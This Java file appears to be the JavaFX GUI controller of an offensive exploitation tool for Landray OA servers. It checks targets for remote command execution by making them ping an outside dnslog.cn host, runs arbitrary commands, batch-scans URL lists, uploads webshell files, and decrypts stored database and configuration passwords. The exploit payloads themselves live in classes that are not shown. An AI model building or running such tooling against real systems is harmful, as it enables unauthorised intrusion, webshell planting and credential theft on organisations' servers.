package com.hello.landray.controller;

import com.hello.PurposeEnum;
import com.hello.factory.ExpFactory;
import com.hello.landray.task.LandrayTask;
import com.hello.tools.landray.DESEncrypt;
import com.hello.seeyon.tools.VulInfo;
import com.hello.strategy.ExpStrategy;
import com.hello.tools.FileUtils;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.input.DragEvent;
import javafx.scene.input.KeyEvent;
import javafx.scene.text.Text;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.*;

public class Controller implements LandrayTask.IMakeResultText{

    /**
     * 密文
     */
    @FXML
    private TextField ciphertext;
    /**
     * 解密文本框
     */
    @FXML
    private TextArea decryptionInfo;
    /**
     * 数据库解密类型
     */
    @FXML
    private ChoiceBox decryptionType;
    @FXML
    private RadioButton mRadiobutton6;

    @FXML
    private TextField jndi_echo;
    @FXML
    private ToggleGroup codegroup;
    @FXML
    private ComboBox<Integer> thread;
    @FXML
    private TableColumn<VulInfo, String> target;
    /**
     * 待检测url列表
     */
    @FXML
    private TextArea checkArea;
    @FXML
    private TableColumn<VulInfo, String> isVul;
    /**
     * 文件上传内容
     */
    @FXML
    private TextArea uploadInfo;
    @FXML
    private Button proxySetupBtn;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private TableColumn<VulInfo, String> cvename;
    @FXML
    private Label tool_name;
    @FXML
    private TableColumn<VulInfo, String> id;
    @FXML
    private TextField jndi_path;
    @FXML
    private TextField mTextArea14;
    @FXML
    private TableView<VulInfo> table_view;
    /**
     * 文件上传路径
     */
    @FXML
    private TextField uploadPath;
    @FXML
    private Text time;
    public static Map<String, Object> settingInfo = new HashMap();
    @FXML
    private TextArea mTextArea15;
    @FXML
    private RadioButton mRadiobutton4;
    /**
     * 漏洞不存在文本框
     */
    @FXML
    private TextArea unAliveArea;
    /**
     * 漏洞存在文本框
     */
    @FXML
    private TextArea aliveArea;
    @FXML
    private RadioButton mRadiobutton3;
    @FXML
    private RadioButton mRadiobutton5;
    /**
     * url地址栏
     */
    @FXML
    private TextField url;
    @FXML
    private TextField file_path;
    @FXML
    private ChoiceBox encoding;
    /**
     * cve下拉选择框
     */
    @FXML
    private ChoiceBox choiceEXP;
    @FXML
    private ChoiceBox platform;

    @FXML
    private ListView<String> listView;
    /**
     * 文件上传输出信息
     */
    @FXML
    private TextArea uploadMsg;
    /**
     * 待执行命令
     */
    @FXML
    private TextArea cmdInfo;
    @FXML
    private ChoiceBox jndi_platform;
    /**
     * 基本信息面板
     */
    @FXML
    public TextArea basicInfo;
    private boolean isStop = false;

    @FXML
    private TextArea jndi_info;
    /**
     * 批量检测状态
     */
    @FXML
    private Label status;
    @FXML
    private TextField cmd;
    /**
     * 批量：目标数量
     */
    private int total;
    /**
     * 批量：已完成检测项
     */
    private int num;
    //创建线程池
    private ExecutorService executor = new ThreadPoolExecutor(10, 10,
            60L, TimeUnit.SECONDS,
            new ArrayBlockingQueue(10));


    /**
     * 初始化界面函数
     */
    public void initialize(){
        //填充漏洞下拉框
        choiceEXP.getItems().add("ALL");
        for (String s : PurposeEnum.getExpType(PurposeEnum.LandrayOA.getExpType())){
            if (!s.isEmpty())
                choiceEXP.getItems().add(s);
        }
        choiceEXP.getSelectionModel().selectFirst();
        //文件上传
        this.uploadInfo.setPromptText("文件内容填充区为base64编码格式");
        this.uploadMsg.setPromptText("上传结果回显区");
        //批量面板初始化
        this.thread.getItems().addAll(10);
        this.checkArea.setPromptText("http://127.0.0.1\r" +
                "https://www.biaud.com");
        //数据库解密初始化
        this.decryptionInfo.setPromptText("后台数据解密:\r打开ekp/WEB-INF/KmssConfig/admin.properties配置文件直接填入password字段即可\r\rOA配置文件解密:\r方式一\r把ekp/WEB-INF/KmssConfig/kmssconfig.properties文件先进行base64编码后再填入\r方式二:\r拖入文件到该文件域即可");
        this.decryptionType.getItems().add("database");
        this.decryptionType.getItems().add("kmssconfig");
        this.decryptionType.getSelectionModel().selectFirst();
    }

    /**
     * cve列表选择事件
     */
    @FXML
    public void choiceEXP(){
        this.basicInfo.setText("");
        String expName = this.choiceEXP.getValue().toString();
        if (expName.equals("ALL")){
            this.basicInfo.appendText("LandrayOA\n");
            this.basicInfo.appendText("[*]蓝凌oa任意命令执行\n");
            return;
        }
        ExpStrategy factApplyStrategy = ExpFactory.getFactApplyStrategy(expName);
        String s = factApplyStrategy.baseInfo();
        this.basicInfo.setText(s);
    }


    /**
     * 漏洞检测
     */
    @FXML
    public void checkUrl(){
        String url = this.url.getText().trim();
        String cve = this.choiceEXP.getValue().toString().trim();
        System.out.println(cve);
        ExpStrategy landray = ExpFactory.getFactApplyStrategy(cve);
        String cmd = "ping%207m5577.dnslog.cn";
        try {
            String s = landray.exeCMD(url, cmd);
            basicInfo.setText(s);
            System.out.println(s);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        //输出漏洞信息在baseinfo面板
        if (landray.isVul()){
            basicInfo.appendText("[+]漏洞存在 \n" +
                    cve+"\n" +
                    "-----------检测完毕-----------");
        }else {
            basicInfo.appendText("[-]漏洞不存在 \n" +
                    cve+"\n" +
                    "-----------检测完毕-----------");
        }

    }


    /**
     * 命令执行
     */
    @FXML
    public void getExecuteCmd(){
        String url = this.url.getText().trim();
        String cmdCode = this.cmd.getText().trim();
        String expName = this.choiceEXP.getValue().toString().trim();
        if (!expName.equals(PurposeEnum.ALL.getExpType())){
            ExpStrategy LandrayOA = ExpFactory.getFactApplyStrategy(expName);
            String result = LandrayOA.exeCMD(url,cmdCode);
            //把检测结果添加到文本框
            this.cmdInfo.appendText(result);
        }
}


    /**
     * jndi方式命令执行
     */
    @FXML
    public void jndiExec() {

    }

    @FXML
    public void mRadiobutton3Click(ActionEvent event){

    }
    @FXML
    public void mRadiobutton4Click(ActionEvent event){

    }
    @FXML
    public void mRadiobutton5Click(ActionEvent event){

    }
    @FXML
    public void mRadiobutton6Click(ActionEvent event){

    }

    @FXML
    public void shellEncode(KeyEvent event) throws FileNotFoundException {}

    @FXML
    public void listViewPressed(){

    }
    @FXML
    public void listViewClicked(){

    }

    /**
     * 批量漏洞检测
     */
    @FXML
    public void startCheck() throws InterruptedException {
        String[] urls = checkArea.getText().split("\n");
        this.total = urls.length;
        this.num = 0;
        String choiceExp = this.choiceEXP.getValue().toString().trim();
        for (String url : urls) {
            this.status.setText(this.num+"/"+this.total);
            LandrayTask returnResultTask = new LandrayTask(url, choiceExp);
            returnResultTask.setClickDelegate(this);
            executor.submit(returnResultTask);
        }


    }

    /**
     * 退出批量漏洞检测
     */
    @FXML
    public void stop(){
        // 禁止新的线程开始任务
        executor.shutdown();
        // 设定最大重试次数
        try {
            // 等待 60 s
            if (!executor.awaitTermination(3, TimeUnit.SECONDS)) {
                // 调用 shutdownNow 取消正在执行的任务
                executor.shutdownNow();
                // 再次等待 60 s，如果还未结束，可以再次尝试，或则直接放弃
                if (!executor.awaitTermination(3, TimeUnit.SECONDS))
                    System.err.println("线程池任务未正常执行结束");
            }
        } catch (InterruptedException ie) {
            // 重新调用 shutdownNow
            executor.shutdownNow();
        }finally {
            executor =new ThreadPoolExecutor(10, 10,
                    60L, TimeUnit.SECONDS,
                    new ArrayBlockingQueue(10));
            Platform.runLater(new Runnable() {
                @Override
                public void run() {
                    status.setText("已终止所有线程");
                }
            });
        }
    }


    /**
     * 文件上传
     */
    public void getShellFile(){
        String url = this.url.getText().trim();
        String fileName = this.uploadPath.getText().trim();
        String fileContent = this.uploadInfo.getText();
        String expName = this.choiceEXP.getValue().toString();
        //文本框判断，避免出现错误类型
        if (expName.equals(PurposeEnum.ALL.getExpType())){
            this.uploadMsg.setText("请选择EXP");
            return;
        }
        if (url == null || url.isEmpty()){
            this.uploadMsg.setText("请输入url");
            return;
        }
        ExpStrategy landray = ExpFactory.getFactApplyStrategy(expName);
        String result = landray.uploadFile(url, fileName, fileContent);
        this.uploadMsg.setText(result);

    }

    /**
     * 蓝凌密文解密
     */
    @FXML
    public void deDeCode(){
        this.decryptionInfo.setText("");
        String password = this.ciphertext.getText().trim();
        String type = this.decryptionType.getValue().toString();
        if (type.isEmpty())
            return;
        if (type.equals("database")){
            String result = DESEncrypt.defaultDes(password);
            this.decryptionInfo.setText(result);
            this.decryptionInfo.appendText("解密完成");
        } else if (type.equals("kmssconfig")) {
            String result = DESEncrypt.pk5Des(password);
            this.decryptionInfo.setText(result);
            this.decryptionInfo.appendText("解密完成");
        }
    }

    /**
     * 对拖入文件进行解密
     * @param event
     */
    @FXML
    public void getFile(DragEvent event){
        List<File> files = event.getDragboard().getFiles();
        File file = files.get(0);
        String path = file.getPath();
        //解密文件
        String s = FileUtils.encodeFile(path);
        String s1 = DESEncrypt.pk5Des(s);
        this.decryptionInfo.setText(s1);
    }

    /**
     * 设置文件拖入后鼠标样式
     * @param event
     */
    @FXML
    public void setModel(DragEvent event){
        event.acceptTransferModes(event.getTransferMode());
    }
    /**
     * 委托接口的实现
     * @param
     */
    @Override
    public void doSuccess(String v) {
        this.aliveArea.appendText(v);
        String[] split = v.split(":");
        this.listView.getItems().add(split[0]+split[1]);
    }

    @Override
    public void doFailure(String v) {
        this.unAliveArea.appendText(v);
    }

    @Override
    public void doFinish() {
        this.num++;
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                status.setText(num+"/"+total);
            }
        });
    }
}
